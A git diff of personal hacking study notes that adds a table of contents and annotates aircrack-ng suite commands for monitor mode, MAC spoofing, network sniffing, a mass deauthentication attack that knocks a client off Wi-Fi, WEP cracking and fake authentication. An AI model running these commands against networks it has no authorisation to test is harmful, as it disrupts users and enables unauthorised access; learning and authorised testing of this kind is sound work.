@@ -1,6 +1,15 @@
 # dump
 Contains non relevant info that I wanna dump
 
+
+## Table of Content
+1. Network Hacking
+    1. Pre-connection Attack
+    1. Gaining Access
+    1. Post-connection Attack
+1. Gaining Access
+1. Post exploitation
+1. Website Hacking 
 ---
 
 ```
@@ -11,8 +20,7 @@ iwconfig [interface-name] mode monitor : Changes wireless mode from managed to m
 ifconfig [interface-name] hw ether [Your_Desired_MAC_Adress]
 ```
 
-
-### airodump-ng
+### airodump-ng : Used by wireless interface in monitor mode to capture packet
 ```
 airodump-ng [interface-name] : Sniffs all the wireless network around with their protection level(Open/WEP/WPA/WPA2) and other critical info
 
@@ -20,10 +28,15 @@ airodump-ng --band [a,b,g,n] [interface-name] : capture packet in band specified
 
 airodump-ng --bssid [bssid] --channel [channel number] --write [filename] [interface-name]
 
-aireplay-ng --deauth  100000 -a [access mac] -c [client mac] [interface-name]
+aireplay-ng --deauth  100000 -a [access mac] -c [client mac] [interface-name] : Disable a user from using wi-fi
 ```
 
-### aircrack-ng
+### aircrack-ng : Used to crack WEP(IV + key) 
 ```
 aircrack-ng [cap-file-name]
+```
+
+### aireplay-ng : Used to generate fake traffic. It comes handy if target wifi is not generating enough traffic
+```
+aireplay-ng --fakeauth 0 -a [mac-of-AP] -h [mac-of wireless-adapter] [interface-name]
 ```
